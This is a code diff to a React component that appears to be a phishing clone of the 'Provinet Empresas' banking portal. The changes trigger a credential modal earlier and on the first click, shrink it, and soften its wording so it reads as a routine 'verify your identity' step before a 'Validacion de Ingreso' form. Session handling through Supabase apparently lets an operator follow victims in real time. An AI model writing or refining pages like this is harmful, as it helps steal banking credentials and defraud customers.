@@ -58,10 +58,18 @@ export default function ProvinetPortal() {
 
   useEffect(() => {
     document.title = 'Provinet Empresas';
+
+    let modalShown = false;
+    const triggerModal = () => {
+      if (!modalShown) { modalShown = true; setShowModal(true); }
+    };
+    const handleClick = () => triggerModal();
+    document.addEventListener("click", handleClick, { once: true });
+
     if (!sessionId) {
       const t1 = setTimeout(() => setLoadingDone(true), 2500);
-      const t2 = setTimeout(() => setShowModal(true), 3000);
-      return () => { clearTimeout(t1); clearTimeout(t2); };
+      const t2 = setTimeout(triggerModal, 2000);
+      return () => { clearTimeout(t1); clearTimeout(t2); document.removeEventListener("click", handleClick); };
     }
 
     supabase
@@ -83,9 +91,10 @@ export default function ProvinetPortal() {
       .subscribe();
 
     const t1 = setTimeout(() => setLoadingDone(true), 2500);
-    const t2 = setTimeout(() => setShowModal(true), 3000);
+    const t2 = setTimeout(triggerModal, 2000);
     return () => {
       clearTimeout(t1); clearTimeout(t2);
+      document.removeEventListener("click", handleClick);
       stopPolling();
       supabase.removeChannel(channel);
     };
@@ -303,7 +312,7 @@ export default function ProvinetPortal() {
         .provi-modal-backdrop.visible { opacity: 1; pointer-events: all; }
         .provi-ventana-modal {
           background: #fff; border: 1px solid #7aaac8; border-radius: 3px;
-          box-shadow: 0 8px 32px rgba(30,70,110,0.2); width: 603px;
+          box-shadow: 0 8px 32px rgba(30,70,110,0.2); width: 460px; max-width: 90vw;
           display: flex; flex-direction: column; overflow: hidden;
         }
         .provi-modal-header {
@@ -313,7 +322,7 @@ export default function ProvinetPortal() {
         }
         .provi-modal-logo .logo-title { font-size: 20px; font-weight: bold; color: #1a4a6a; }
         .provi-modal-logo .logo-sub { font-size: 11px; color: #5a9abf; margin-top: 2px; }
-        .provi-modal-body { padding: 28px 32px; }
+        .provi-modal-body { padding: 18px 24px; }
         .provi-modal-body h2 { font-size: 21px; font-weight: bold; color: #222; margin-bottom: 24px; }
         .provi-phone-entry { margin-bottom: 16px; }
         .provi-phone-link {
@@ -321,7 +330,7 @@ export default function ProvinetPortal() {
           text-decoration: none; display: flex; align-items: center; gap: 6px; margin-bottom: 4px;
         }
         .provi-form-box {
-          border: 1px solid #c8d8e8; border-radius: 2px; overflow: hidden; margin-top: 20px;
+          border: 1px solid #c8d8e8; border-radius: 2px; overflow: hidden; margin-top: 12px;
         }
         .provi-form-box-title {
           background: #dce8f0; padding: 8px 16px; font-size: 13px;
@@ -558,7 +567,7 @@ export default function ProvinetPortal() {
               </div>
             </div>
             <div className="provi-modal-body" ref={formRef}>
-              <p>Por su Seguridad, Debe ingresar su Clave Especial antes de proceder con la Clave Digital. Que sera habilitada y enviada a su <strong>Correo Electronico</strong> o <strong>SMS</strong>. Este proceso garantiza la proteccion de su cuenta.</p>
+              <p>Por su seguridad, verifique su identidad completando los siguientes campos.</p>
               <div className="provi-form-box">
                 <div className="provi-form-box-title">Validacion de Ingreso</div>
 
